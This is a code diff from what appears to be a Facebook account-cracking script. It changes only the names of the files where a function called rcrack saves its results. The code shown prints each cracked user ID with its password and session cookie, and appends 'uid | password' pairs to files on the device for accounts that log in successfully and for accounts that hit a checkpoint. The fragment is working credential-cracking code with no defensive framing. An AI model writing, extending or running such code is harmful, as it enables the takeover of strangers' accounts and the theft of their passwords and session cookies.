@@ -177,7 +177,7 @@ def rcrack(uid,pwx,tl):
                 cid = coki[65:80]
                 print(f"\033[1;33m[HASAN-OK🥰] {uid} • {ps}" '  \n\033[1;33m [🍁]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [😜] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                 os.system("espeak \"HASAN, OK, ID \"")
-                open('/sdcard/HASAN-OK🥰.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/SHOAIB-OK🥰.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
@@ -185,7 +185,7 @@ def rcrack(uid,pwx,tl):
                 cid = coki[82:97]
                 print(f"\033[1;32m[JIBON-CP😔] \033[1;31m{uid} • {ps}")
                 os.system("espeak \"JIBON, CP, ID \"")
-                open('/sdcard/JIBON-CP😔.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/SHOAIB-CP😔.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
